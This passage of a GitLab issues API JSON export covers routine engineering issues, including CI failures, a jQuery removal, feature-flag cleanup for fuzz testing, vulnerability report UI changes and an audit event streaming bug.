completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347212","notes":"https://gitlab.com/api/v4/projects/278964/issues/347212/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347212/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347212","relative":"#347212","full":"gitlab-org/gitlab#347212"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5246,"epic":{"id":185171,"iid":5246,"title":"Pipeline Editor Auto-complete","url":"/groups/gitlab-org/-/epics/5246","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98506172,"iid":347202,"project_id":278964,"title":"package-and-qa fails consistently in master","description":"An example is https://gitlab.com/gitlab-org/gitlab/-/jobs/1849278525\n\n```\n$ tooling/bin/find_change_diffs ${CHANGES_DIFFS_DIR}\nCI_MERGE_REQUEST_PROJECT_PATH is missing.\nCI_MERGE_REQUEST_IID is missing.\nExiting as this does not appear to be a merge request pipeline.\n$ tooling/bin/qa/check_if_qa_only_spec_changes ${CHANGES_FILE} ${ONLY_QA_CHANGES_FILE} # collapsed multi-line command\ntooling/bin/qa/check_if_qa_only_spec_changes:9:in `read': No such file or directory @ rb_sysopen - tmp/changed_files.txt (Errno::ENOENT)\n\tfrom tooling/bin/qa/check_if_qa_only_spec_changes:9:in `\u003cmain\u003e'\n```","state":"closed","created_at":"2021-12-06T08:47:58.085Z","updated_at":"2022-03-16T11:29:08.436Z","closed_at":"2021-12-06T17:29:57.237Z","closed_by":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Engineering Productivity","Quality","maintenance::pipelines","priority::1","severity::1","type::maintenance","workflow::in review"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347202","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347202","notes":"https://gitlab.com/api/v4/projects/278964/issues/347202/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347202/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347202","relative":"#347202","full":"gitlab-org/gitlab#347202"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98490039,"iid":347189,"project_id":278964,"title":"Replace jQuery usage in the group transfer form","description":"\n## Overview\nWe should remove the remaining use of jQuery in the group transfer form and update the relevant test. We might be able to use vanilla JS, or take a similar approach used in the [transfer project form](!72361)\n\n## TODO\n\n* [x] Replace jQuery dropdown with `gl-dropdown` equivalent\n* [x] Update button type from `warning` to `danger`\n* [x] Add confirmation modal when clicking the transfer group button\n\nRelated files:\n- [x] https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/groups/settings/_transfer.html.haml\n- [x] https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/pages/groups/edit/index.js\n\nNOTE: We might be able to remove https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/transfer_edit.js as well\n\n## Background \n\nThe following discussion from !72361 should be addressed:\n\n- [ ] @ekigbo started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72361#note_734456431):  (+1 comment)\n\n    \u003e Here, i'm updating this spec to use the content from the `group transform form`, it would be nice to also remove the relevant jquery from that form, but it's outside this scope of this issue.\n    \u003e \n    \u003e This test was originally hardcoded against the transfer project html fixture, in this MR we are replacing the contents of the related html page, so updating to use the group transfer form made the most sense.","state":"closed","created_at":"2021-12-06T01:25:45.677Z","updated_at":"2022-02-03T03:35:08.661Z","closed_at":"2022-02-03T03:35:08.649Z","closed_by":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"labels":["Community contribution","auto updated","devops::manage","frontend","group::optimize","jQuery","javascript","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"}],"author":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"type":"ISSUE","assignee":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"user_notes_count":24,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347189","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":5},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"5 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347189","notes":"https://gitlab.com/api/v4/projects/278964/issues/347189/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347189/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347189","relative":"#347189","full":"gitlab-org/gitlab#347189"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98489502,"iid":347188,"project_id":278964,"title":"Broken master: RSpec/TimecopFreeze offenses","description":"https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76030 has broken some pipeline jobs https://gitlab.com/gitlab-org/gitlab/-/pipelines/423015097. We'll need to restore some of those lines.","state":"closed","created_at":"2021-12-06T01:14:37.305Z","updated_at":"2022-01-26T08:25:23.455Z","closed_at":"2021-12-06T04:17:38.953Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["Engineering Productivity","backend","master:broken","priority::1","severity::1","workflow::in review"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347188","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347188","notes":"https://gitlab.com/api/v4/projects/278964/issues/347188/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347188/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347188","relative":"#347188","full":"gitlab-org/gitlab#347188"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98486748,"iid":347187,"project_id":278964,"title":"Feature flag Cleanup/Removal","description":"Related to #328418.\n\n\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Feature\n\nThis feature uses the `:corpus_management` feature flag! Look for references to `corpusManagement`, `corpus_management`\n\nAlso look for references to `:corpus_management_ui` and `corpusManagementUi`\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n- [Issue Name](ISSUE LINK)\n\n## Owners\n\n- Team: Secure:Fuzzing\n- Most appropriate slack channel to reach out to: `#g_secure-fuzz-testing`\n- Best individual to reach out to: @farias-gl \n- PM: @derekferguson \n\n\n**Cleanup**\n\nThis is an __important__ phase, that should be either done in the next Milestone or as soon as possible. For the cleanup phase, please follow our documentation on how to  [clean up the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up).\n\n\u003c!-- The checklist here is to keep track of it's status for stakeholders --\u003e\n- [x] Announce on the issue that the flag has been enabled\n\n- [x] Remove `:corpus_management` and `:corpus_management_ui` feature flag\n    - [x] Remove all references to the feature flag from the codebase\n    - [x] Remove the YAML definitions for the feature from the repository\n    - [x] Create a Changelog Entry\n\n- [x] Clean up the feature flag from all environments by running this chatops command in `#production` channel `/chatops run feature delete some_feature`.\n\n**Final Step**\n\n- [x] Close this rollout issue for the feature flag after the feature flag is removed from the codebase.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set --project=gitlab-org/gitlab feature_name false\n```","state":"closed","created_at":"2021-12-05T23:28:30.618Z","updated_at":"2022-03-21T17:39:54.350Z","closed_at":"2022-03-16T11:27:32.190Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["Category:Fuzz Testing","GitLab Ultimate","devops::secure","feature flag","frontend","fuzzing::coverage","group::dynamic analysis","section::sec","type::feature"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},{"id":8995688,"username":"atiwari71","name":"Aditya Tiwari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8995688/avatar.png","web_url":"https://gitlab.com/atiwari71"}],"author":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347187","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":7},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"7 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347187","notes":"https://gitlab.com/api/v4/projects/278964/issues/347187/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347187/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347187","relative":"#347187","full":"gitlab-org/gitlab#347187"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6902,"epic":{"id":367971,"iid":6902,"title":"Fuzz corpus management - Clean Up","url":"/groups/gitlab-org/-/epics/6902","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98434344,"iid":347155,"project_id":278964,"title":"Change pipeline vulnerability reports to use new vulnerability report component","description":"**NOTE:** This issue requires that #338790 be completed first.\n\nNow that we have a reusable vulnerability report component, we need to change group, instance, project, and pipeline vulnerability reports to use it.\n\n## Implementation plan\n\nConvert the following components to use the new vulnerability report component:\n\n- [ ] `ee/app/assets/javascripts/security_dashboard/components/pipeline/pipeline_findings.vue`\n\n## How to verify\n\n1. Clone a project that has vulnerability scanners configured, for example this one: https://gitlab.com/gitlab-examples/security/security-reports.git\n\n2. Run a pipeline against the master branch.\n\n3. Go to the pipeline details page and click on the security tab. Verify that you see the old Vuex version of the report, which looks like this:\n\n||\n|-|\n|![ksnip_20220319-225912](/uploads/e762f3b664b518a7df165d4b930f84c7/ksnip_20220319-225912.png)|\n\n4. Enable the `:pipeline_security_dashboard_graphql` feature flag.\n\n5. Refresh the page. It may take a few refreshes before the feature flag change is applied. Verify that you see the new GraphQL version of the report, which looks like this:\n\n||\n|-|\n|![ksnip_20220319-230054](/uploads/049c449b5431a28169dad2889934bccc/ksnip_20220319-230054.png)|","state":"closed","created_at":"2021-12-03T20:55:35.965Z","updated_at":"2022-03-24T16:45:35.254Z","closed_at":"2022-03-24T16:45:35.227Z","closed_by":{"id":5412787,"username":"nmccorrison","name":"Neil McCorrison","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5412787/avatar.png","web_url":"https://gitlab.com/nmccorrison"},"labels":["Category:Vulnerability Management","GitLab Ultimate","devops::secure","frontend","group::threat insights","priority::4","section::sec","type::maintenance","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5412787,"username":"nmccorrison","name":"Neil McCorrison","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5412787/avatar.png","web_url":"https://gitlab.com/nmccorrison"}],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":{"id":5412787,"username":"nmccorrison","name":"Neil McCorrison","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5412787/avatar.png","web_url":"https://gitlab.com/nmccorrison"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347155","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347155","notes":"https://gitlab.com/api/v4/projects/278964/issues/347155/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347155/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347155","relative":"#347155","full":"gitlab-org/gitlab#347155"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4969,"epic":{"id":148197,"iid":4969,"title":"Convert the pipeline security tab to use GraphQL \u0026 shared UI components","url":"/groups/gitlab-org/-/epics/4969","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98422728,"iid":347133,"project_id":278964,"title":"Vulnerability report - IAC scanner not enabled needs label text","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\n### Steps to reproduce\n\nWe added IaC scanning in %14.5. The vulnerability report correctly shows that it isn't enabled, but doesn't have the variable name replaced with the actual label: `SAST_IAC is not enabled for this project.` should be `Infrastructure as Code (IaC) Scanning is not enabled for this project.`\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\n`SAST_IAC is not enabled for this project.` shows the variable name.\n\n\u003c!-- Describe what you should see instead. --\u003e\n\n`SAST_IAC is not enabled for this project.` should be `Infrastructure as Code (IaC) Scanning is not enabled for this project.`\n\nhttps://gitlab.com/gitlab-examples/security/security-reports/-/security/vulnerability_report\n\n![image](/uploads/063dae9f939867a38b83acb7f55260e9/image.png)\n\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n- [ ] Make sure a translation is provided for `SAST_IAC` in:\n  - [ ] `ee/app/assets/javascripts/security_dashboard/components/project/project_vulnerabilities.vue`\n  - [ ] `ee/app/assets/javascripts/security_dashboard/components/project/project_vulnerability_report.vue`","state":"closed","created_at":"2021-12-03T16:00:27.024Z","updated_at":"2021-12-18T16:46:22.297Z","closed_at":"2021-12-18T08:24:19.649Z","closed_by":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"labels":["devops::secure","group::static analysis","priority::2","section::sec","severity::4","type::bug","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"}],"author":{"id":5412787,"username":"nmccorrison","name":"Neil McCorrison","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5412787/avatar.png","web_url":"https://gitlab.com/nmccorrison"},"type":"ISSUE","assignee":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347133","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347133","notes":"https://gitlab.com/api/v4/projects/278964/issues/347133/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347133/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347133","relative":"#347133","full":"gitlab-org/gitlab#347133"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":98419123,"iid":347128,"project_id":278964,"title":"Design: Adapt MR merge widget to new framework","description":"As a follow-up to changes made to the **\u003cabbr title=\"merge request\"\u003eMR\u003c/abbr\u003e merge widget** in https://gitlab.com/groups/gitlab-org/-/epics/5589, we need to adapt it to the [new framework design guidelines](https://design.gitlab.com/regions/merge-request-reports).\n\nThis issue is to align the current design to the future design, in preparation for the actual code changes. The changes should be only stylistic: text styles, button placement, icons, and responsive behavior.\n\n[** Design specs in Figma**](https://www.figma.com/file/omvNuR8nn90V8hjVN78OQO/Adapt-MR-merge-widget-to-framework-%23347128?node-id=845%3A1298)","state":"closed","created_at":"2021-12-03T14:49:00.538Z","updated_at":"2022-01-05T15:07:47.029Z","closed_at":"2022-01-05T15:07:46.957Z","closed_by":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"labels":["UX","auto updated","devops::create","feature::enhancement","group::code review","merge request widget","merge requests","section::dev","type::feature","workflow::design"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"}],"author":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"type":"ISSUE","assignee":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"user_notes_count":6,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347128","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347128","notes":"https://gitlab.com/api/v4/projects/278964/issues/347128/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347128/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347128","relative":"#347128","full":"gitlab-org/gitlab#347128"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7340,"epic":{"id":414918,"iid":7340,"title":"Adapt MR merge widget to new framework","url":"/groups/gitlab-org/-/epics/7340","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":98396958,"iid":347108,"project_id":278964,"title":"Audit event streaming worker cannot be called inside a transaction","description":"## Overview\n\nAfter we rolled out [Audit Event Streaming](https://docs.gitlab.com/ee/administration/audit_event_streaming.html), @manojmj noticed a spike in caught exceptions in Sentry relating to the sidekiq worker. (https://sentry.gitlab.net/gitlab/gitlabcom/?query=is%3Aunresolved+AuditEventStreamingWorker.perform_async) **Internal link**\n\nThis is because some auditable actions (transferring projects, creating/updating feature flags) are done within a transactions and it is not possible to enqueue a sidekiq job from within a transaction.\n\n## Impact\n\n* Exception occurring with a relatively small proportion of Audit Events, and only where the [`ff_external_audit_events_namespace` feature flag](https://docs.gitlab.com/ee/administration/audit_event_streaming.html) is enabled.\n* Exception is tracked within sentry.\n* Controller action is not halted, user-impact is minimal in the UI.\n* Audit event is saved, as expected.\n* **Event expected to be streamed, is not streamed.**\n\n## Suggested resolution\n\n* Use the AfterCommitQueue concern to perform the streaming after the transaction has finished.\n\nThanks @manojmj for the bug report and suggested resolution :purple_heart:","state":"closed","created_at":"2021-12-03T08:44:40.410Z","updated_at":"2022-05-23T09:54:39.133Z","closed_at":"2022-01-04T09:37:33.513Z","closed_by":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"labels":["Category:Audit Events","backend","devops::manage","group::compliance","priority::2","section::dev","severity::2","type::bug","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"}],"author":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"type":"ISSUE","assignee":{"id":5833976,"username":"mwoolf","name":"Max 